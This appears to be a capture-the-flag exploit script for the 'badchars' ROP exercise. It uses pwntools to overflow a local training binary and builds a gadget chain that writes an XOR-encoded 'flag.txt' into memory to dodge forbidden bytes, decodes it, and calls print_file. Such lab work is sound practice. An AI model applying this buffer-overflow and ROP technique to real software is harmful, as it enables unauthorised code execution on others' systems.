#!/usr/bin/env python
from pwn import *

# setup pwntools to work with binary
elf = context.binary = ELF('badchars')
io = process(elf.path)

# badchars are: 'x', 'g', 'a', '.'

# memory values
flag = 0x767a762c65636e64 # "dnce,vzv" # flag.txt xor 2
data_addr = 0x000000000601038
xor_r14_r15 = 0x400628
mov_r13_r12 = 0x400634
print_file = 0x400510
pop_r14_415 = 0x4006a0
pop_rdi = 0x4006a3
pop_r12_r13_r14_r15 = 0x40069c

# creating payload
buf = "" #initial setup
buf += 'A'*40

buf += p64(pop_r12_r13_r14_r15)
buf += p64(flag) + p64(data_addr) + p64(2) + p64(2)
buf += p64(mov_r13_r12)

for i in range(8): #xor every charecter
    buf += p64(pop_r14_415)
    buf += p64(2) + p64(data_addr + i)
    buf += p64(xor_r14_r15)

buf += p64(pop_rdi) #final section to call print file with data
buf += p64(data_addr)
buf += p64(print_file)

# sending payload
io.sendline(buf)
io.interactive()


# badchars are: 'x', 'g', 'a', '.'
# a = ['f','l','a','g','.','t','x','t'] # flag.txt
# n = ""
# for i in a:
#     n += chr(ord(i)^2) # xor with 2
# print n